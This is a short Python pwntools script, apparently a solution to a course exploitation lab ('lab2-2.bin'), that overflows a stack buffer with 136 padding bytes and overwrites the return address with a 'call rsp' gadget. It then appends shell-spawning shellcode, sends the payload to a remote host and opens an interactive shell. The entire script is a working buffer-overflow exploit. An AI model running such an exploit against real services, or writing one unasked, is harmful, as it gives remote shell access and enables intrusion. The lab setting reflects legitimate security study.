from pwn import *

context.arch = "amd64"

# ROP gadget in the  binary => call rsp;
CALL_RSP = 0x401259
print("The ROP gadget instruction 'call rsp;' is at binary code address: 0x{:X}".format(CALL_RSP))
print("")
print("The ROP gadget instruction 'call rsp;' in packed 64 format is: ", p64(CALL_RSP))
print("")

# Shell call code
SHELLCODE = asm(shellcraft.amd64.linux.sh())
print("The shellcode payload is:", (SHELLCODE))
print("")

# Segmentation Fault is at offset 136, so we create 136 junk bytes
PADDING = ((b'A'*16) + (b'B'*16) + (b'C'*16) + (b'D'*16) + (b'E'*16) + (b'F'*16) + (b'G'*16) + (b'H'*16) + (b'I'*8))
print("The offset padding junkbytes string is: ", PADDING)
print("")

# Payload
payload = (PADDING + p64(CALL_RSP) + SHELLCODE)
print("The full payload is :", payload)
print("")

# Start a local process
#p = gdb.debug("./lab2-2.bin")
#p = process("./lab2-2.bin")

# Start a remote process
p = remote("csc748.hostbin.org", 7022)

# Receive and print  response
response = p.recvuntil("?:")
print(response)


# Send payload
p.sendline(payload)

# Switch to interactive
p.interactive()
